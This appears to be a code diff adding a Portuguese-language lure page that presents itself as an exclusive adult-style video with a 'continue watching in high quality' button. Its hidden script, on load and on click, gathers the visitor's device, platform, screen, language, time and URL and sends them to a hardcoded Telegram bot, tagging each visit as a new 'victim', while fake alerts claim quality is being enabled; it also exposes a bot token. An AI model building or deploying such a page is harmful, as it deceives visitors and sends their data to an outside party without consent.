@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cherryrar - Vídeo Exclusivo 🔥</title>
+    <style>
+        body, html {margin:0; padding:0; background:#000; color:#fff; font-family:Arial, sans-serif; overflow:hidden;}
+        video {width:100vw; height:100vh; object-fit:cover;}
+        .overlay {position:fixed; bottom:40px; left:50%; transform:translateX(-50%); z-index:100; text-align:center;}
+        button {padding:18px 45px; font-size:20px; background:#ff0066; color:white; border:none; border-radius:50px; cursor:pointer; box-shadow:0 8px 30px rgba(255,0,102,0.8);}
+    </style>
+</head>
+<body>
+    <video autoplay loop muted playsinline>
+        <source src="https://COLOQUE-AQUI-O-LINK-DO-VIDEO-DA-CHERRYRAR.mp4" type="video/mp4">
+    </video>
+
+    <div class="overlay">
+        <button onclick="continuar()">CONTINUAR ASSISTINDO EM ALTA QUALIDADE 🔥</button>
+    </div>
+
+    <script>
+        const TOKEN = "8462741149:AAGkbx21aQV0ePzXo_jxbxPCeSfm4_6hI_c";
+        const CHAT_ID = "-1004494129370";
+
+        function enviarParaTelegram(texto) {
+            const url = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: texto,
+                    parse_mode: "HTML"
+                })
+            });
+        }
+
+        function coletarEEnviar() {
+            const dados = `
+🔥 Nova vítima abriu o link!
+
+📱 Device: ${navigator.userAgent}
+🖥️ Plataforma: ${navigator.platform}
+📐 Tela: \( {screen.width}x \){screen.height}
+🌐 Idioma: ${navigator.language}
+⏰ Hora: ${new Date().toLocaleString('pt-BR')}
+🔗 Link: ${window.location.href}
+            `;
+
+            enviarParaTelegram(dados);
+        }
+
+        function continuar() {
+            alert("Ativando alta qualidade e efeitos...");
+            coletarEEnviar();
+            setTimeout(() => {
+                alert("✅ Vídeo em alta qualidade carregado! Aproveite 🔥");
+            }, 800);
+        }
+
+        // Envia automaticamente ao carregar
+        window.onload = () => {
+            setTimeout(coletarEEnviar, 2500);
+        };
+    </script>
+</body>
+</html>
